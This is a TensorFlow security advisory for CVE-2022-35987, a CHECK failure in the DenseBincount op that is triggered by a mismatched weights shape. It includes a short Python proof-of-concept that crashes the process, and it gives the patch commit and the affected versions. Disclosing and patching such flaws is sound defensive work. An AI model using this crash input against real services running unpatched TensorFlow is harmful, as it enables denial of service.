<h2>TFSA-2022-118: <code>CHECK</code> fail in <code>DenseBincount</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-35987</p>
<h3>Impact</h3>
<p><code>DenseBincount</code> assumes its input tensor <code>weights</code> to either have the same shape as its input tensor <code>input</code> or to be length-0. A different <code>weights</code> shape will trigger a <code>CHECK</code> fail that can be used to trigger a denial of service attack.
<code>python
import tensorflow as tf
binary_output = True
input = tf.random.uniform(shape=[0, 0], minval=-10000, maxval=10000, dtype=tf.int32, seed=-2460)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.DenseBincount(input=input, size=size, weights=weights, binary_output=binary_output)</code></p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/bf4c14353c2328636a18bfad1e151052c81d5f43">bf4c14353c2328636a18bfad1e151052c81d5f43</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
